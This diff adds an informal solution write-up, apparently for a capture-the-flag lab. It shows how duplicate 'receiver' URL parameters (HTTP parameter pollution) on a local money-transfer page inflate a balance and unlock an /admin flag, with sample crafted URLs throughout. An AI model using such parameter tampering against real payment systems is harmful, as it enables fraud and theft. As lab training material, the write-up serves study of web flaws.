@@ -1,0 +1,23 @@
+when you sent request you can see this kind of link http://localhost:9999/index.php?sender=Groot&receiver=Rocket&amount=200
+
+just add &receiver=Groot at the and of the link
+like this: - 
+http://localhost:9999/index.php?sender=Groot&receiver=Rocket&amount=200&receiver=Groot
+
+do this till the balance of Groot reach upto or more than 2000 
+then visit /admin and you will get the flag
+
+
+---------------------------Update---------------------------------------------------------------
+This update does not change solve. Just added minor checks
+1)receiver and sender should not be same
+
+2)number of receiver in url parameter should be 2 because than and only than it will update the value of reciver as the value of last reciver
+so,
+http://localhost:9999/index.php?sender=Rocket&receiver=Rocket&amount=200&receiver=Groot  --> this will send money from Rocket to Groot
+
+http://localhost:9999/index.php?sender=Groot&receiver=Rocket&amount=200&receiver=Groot  --> this will say you cannot send money to yourself
+
+http://localhost:9999/index.php?sender=Groot&receiver=Groot&amount=200&receiver=Rocket  --> this will send money from Groot to Rocket
+
+value of second receiver would be consider as a value of receiver
